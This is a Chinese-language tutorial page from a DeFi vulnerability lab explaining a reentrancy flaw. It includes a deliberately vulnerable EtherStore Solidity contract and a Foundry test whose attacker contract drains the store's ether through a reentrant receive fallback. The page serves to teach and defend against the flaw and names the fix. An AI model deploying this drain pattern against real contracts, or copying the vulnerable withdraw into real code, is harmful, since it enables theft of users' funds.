# 可重入性
[Reentrancy.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Reentrancy.sol)  

**名称：** 可重入性漏洞  

**描述：**  
在EtherStore智能合约设计中有一个可重入性漏洞的缺陷，这会允许攻击者利用重入性漏洞从EtherStore合约中提取超过其应提取的资金。  
该漏洞源于EtherStore合约中的withdrawFunds函数，该函数在更新余额之前，将以太币转账到攻击者的地址。  
这使得攻击者的合约能够在余额更新之前重新调用withdrawFunds函数，从而导致多次提取资金并有可能耗尽EtherStore合约中的所有以太币。  

**场景：**  
EtherStore合约是一个简单的金库，它可以管理每个人的以太币。  
但是它存在漏洞，你能窃取所有的以太币吗？  


**解决方法：**  
遵守“检查-效果-交互”的原则和使用OpenZepplin的重入保护。  


**参考：**  
https://slowmist.medium.com/introduction-to-smart-contract-vulnerabilities-reentrancy-attack-2893ec8390a  

https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/  


**EtherStore合约：**  
```solidity
contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        (bool send, ) = msg.sender.call{value: _weiToWithdraw}("");
        require(send, "send failed");

        // 取款后，检查是否还有有足够的余额，以避免下溢情况。
        //check if after send still enough to avoid underflow
        if (balances[msg.sender] >= _weiToWithdraw) {
            balances[msg.sender] -= _weiToWithdraw;
        }
    }
}
```

**如何测试：**  

`forge test --contracts src/test/Reentrancy.sol -vvvv`  
```solidity
// 用于测试EtherStore合约是否存在重入攻击漏洞的函数 
function testReentrancy() public {
    // 执行攻击合约的Attack函数
    attack.Attack();
}

// 攻击EtherStore合约的合约
contract EtherStoreAttack is Test {
    // 待攻击的EtherStore合约实例
    EtherStore store;

    // 初始化EtherStore合约
    constructor(address _store) {
        store = EtherStore(_store);
    }

    // 执行攻击的函数
    function Attack() public {
        // 记录EtherStore合约的余额
        console.log("EtherStore balance", address(store).balance);

        // 向EtherStore合约存入1个以太币
        store.deposit{value: 1 ether}();

        // 记录EtherStore合约新余额
        console.log(
            "Deposited 1 Ether, EtherStore balance",
            address(store).balance
        );
        //从EtherStore合约取走1个以太币, 这就是可以攻击的地方
        store.withdrawFunds(1 ether); 

        // 记录攻击合约的余额
        console.log("Attack contract balance", address(this).balance);
        //记录EtherStore合约取款后的余额
        console.log("EtherStore balance", address(store).balance);
    }

    // 利用可重入漏洞的回退函数
    receive() external payable {
        // 记录攻击合约的余额
        console.log("Attack contract balance", address(this).balance);
        // 记录EtherStore合约的余额
        console.log("EtherStore balance", address(store).balance);
        // 判断EtherStore合约余额是否至少有1个以太币
        if (address(store).balance >= 1 ether) {
            // 取走1个以太币，这就是在回退函数中利用到的漏洞
            store.withdrawFunds(1 ether); 
        }
    }
}
```
**红色框：**  攻击成功，取完了EtherStore合约中的以太币。
![image](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F6c7fb809-e4be-407c-a133-64416461a86e%2FUntitled.png?table=block&id=cc44df8e-6a18-44b2-b9e9-892b3b29be79&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)

